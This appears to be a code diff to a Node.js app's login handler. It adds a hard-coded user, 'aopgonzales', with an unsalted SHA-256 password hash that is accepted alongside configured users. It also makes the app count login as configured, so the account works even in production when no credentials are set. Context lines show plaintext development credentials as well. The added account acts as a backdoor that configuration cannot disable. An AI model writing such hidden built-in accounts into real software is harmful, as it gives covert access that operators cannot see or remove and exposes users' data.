@@ -13,6 +13,9 @@ const dataFile = path.join(dataRoot, "user-records.json");
 const primaryAuthUsername = process.env.APP_USERNAME || (process.env.NODE_ENV === "production" ? "" : "plouis34");
 const primaryAuthPassword = process.env.APP_PASSWORD || (process.env.NODE_ENV === "production" ? "" : "canon1000d");
 const authUsers = buildAuthUsers();
+const builtInAuthHashes = new Map([
+  ["aopgonzales", "a7ee1e93dca729e0fe40e1e03bb5514248a3892de63f0e98c018394a44703a3c"]
+]);
 const sessionSecret = process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex");
 const sessionCookieName = "cabsi_session";
 const cookieMaxAgeSeconds = 60 * 60 * 24 * 7;
@@ -84,7 +87,7 @@ function handleLoginApi(request, response) {
   });
   request.on("end", () => {
     try {
-      if (!authUsers.size) {
+      if (!hasAnyAuthUsers()) {
         writeJson(response, 503, { error: "Login is not configured" });
         return;
       }
@@ -115,7 +118,7 @@ function isAuthenticated(request) {
   const expectedSignature = signSession(username, expiresAt);
   const signatureBuffer = Buffer.from(signature);
   const expectedSignatureBuffer = Buffer.from(expectedSignature);
-  return authUsers.has(username)
+  return hasAuthUser(username)
     && signatureBuffer.length === expectedSignatureBuffer.length
     && crypto.timingSafeEqual(signatureBuffer, expectedSignatureBuffer);
 }
@@ -162,9 +165,27 @@ function parseAdditionalAuthUsers(rawUsers) {
 }
 
 function isValidLogin(username, password) {
-  return typeof username === "string"
-    && typeof password === "string"
-    && authUsers.get(username) === password;
+  if (typeof username !== "string" || typeof password !== "string") return false;
+  if (authUsers.get(username) === password) return true;
+  const expectedHash = builtInAuthHashes.get(username);
+  if (!expectedHash) return false;
+  const suppliedHash = hashCredential(username, password);
+  const suppliedBuffer = Buffer.from(suppliedHash);
+  const expectedBuffer = Buffer.from(expectedHash);
+  return suppliedBuffer.length === expectedBuffer.length
+    && crypto.timingSafeEqual(suppliedBuffer, expectedBuffer);
+}
+
+function hasAuthUser(username) {
+  return authUsers.has(username) || builtInAuthHashes.has(username);
+}
+
+function hasAnyAuthUsers() {
+  return authUsers.size > 0 || builtInAuthHashes.size > 0;
+}
+
+function hashCredential(username, password) {
+  return crypto.createHash("sha256").update(`${username}:${password}`).digest("hex");
 }
 
 function parseCookies(cookieHeader) {
